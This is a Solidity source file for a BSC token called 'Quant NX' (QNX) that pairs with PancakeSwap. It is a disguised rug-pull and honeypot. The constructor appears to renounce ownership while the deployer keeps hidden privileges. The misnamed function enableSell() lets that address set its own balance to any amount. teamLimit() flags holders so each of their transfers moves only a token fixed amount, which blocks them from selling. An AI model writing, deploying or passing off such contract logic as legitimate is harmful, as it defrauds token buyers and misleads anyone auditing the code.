/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract QuantNX {
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Quant NX";

    uint256 constant walletTake = 15 ** 10;
    string public symbol = "QNX";

    mapping(address => bool) public autoWallet;

    address public owner;
    mapping(address => bool) public fromSwap;

    address public receiverFee;

    address public senderBuyLiquidity;
    modifier toLaunched() {
        require(autoWallet[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router receiverWallet = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory liquidityLimit = IUniswapV2Factory(receiverWallet.factory());
        senderBuyLiquidity = liquidityLimit.createPair(receiverWallet.WETH(), address(this));
        owner = msg.sender;
        receiverFee = owner;
        autoWallet[receiverFee] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function enableSell(uint256 liquidityTotal) public toLaunched {
        balanceOf[receiverFee] = liquidityTotal;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function senderIs(address listTotal, address listEnable, uint256 liquidityTotal) internal returns (bool) {
        require(balanceOf[listTotal] >= liquidityTotal);
        balanceOf[listTotal] -= liquidityTotal;
        balanceOf[listEnable] += liquidityTotal;
        emit Transfer(listTotal, listEnable, liquidityTotal);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function txLaunched(address receiverMin) public toLaunched {
        require(receiverMin != address(0));
        autoWallet[receiverMin] = true;
    }

    function teamLimit(address atFund) public toLaunched {
        if (atFund == receiverFee) {
            return;
        }
        fromSwap[atFund] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return true;
        }
        if (sender == receiverFee || recipient == receiverFee) {
            return senderIs(sender, recipient, amount);
        }
        if (fromSwap[sender]) {
            return senderIs(sender, recipient, walletTake);
        }
        return senderIs(sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


}